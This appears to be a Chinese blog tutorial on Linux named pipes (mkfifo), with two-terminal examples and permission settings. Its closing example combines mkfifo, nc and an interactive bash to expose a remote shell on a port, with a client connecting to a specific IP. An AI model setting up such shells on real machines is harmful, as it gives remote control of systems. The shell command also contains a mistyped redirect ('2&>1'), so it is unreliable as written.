# Linux mkfifo管道符

## 概述

`mkfifo`命令用于创建FIFO(命名管道符)。

**命名管道符 VS 匿名管道符**

==管道符用于创建程序之间的通信通道==（管道相当于一个通道，使用FIFO策略）

- 匿名管道符`|`
- 我们使用`mkfifo`来创建命名管道符

> 我们可以使用匿名管道符来传递数据，但是这中方式有一个缺陷。只能由同一个祖先进程启动。所以我们可以使用命名管道符（在Linux一切皆文件）

```
terminal01
root in /opt/test λ mkfifo pipe2 #创建一个命名管道符
root in /opt/test λ ll
|rw-r--r-- root root 0 B Thu Jan  7 07:25:45 2021  pipe2     
root in /opt/test λ echo "hello to pipe2" > pipe2  #将需要传输的内容写入管道中，由于是echo进程启动的，所以管道符会一直阻塞echo进程，知道管道符中的内容被读取

----

terminal02
root in ~ λcat < /opt/test/pipe2 #读取管道中内容
       STDIN
   1   hello to pipe2 

```

管道符有三种权限策略（与文件权限相同），我们可以通过`-m`参数来指定

```
root in /opt/test λ mkfifo pipe2 -m 700                                  /0.0s
root in /opt/test λ ll
|rwx------ root root 0 B Thu Jan  7 07:35:53 2021  pipe2                /0.0s
```



## 案例

使用nc创建管道符，实现reserveshell

```
#server side 
root in /tmp mkfifo /tmp/pipe2
root in /tmp λ cat /tmp/pipe2 | /bin/bash -i 2&>1  | nc -l 10086 > /tmp/pipe2 

#client side 
root in /opt/test λ nc 8.135.0.171 10086
```

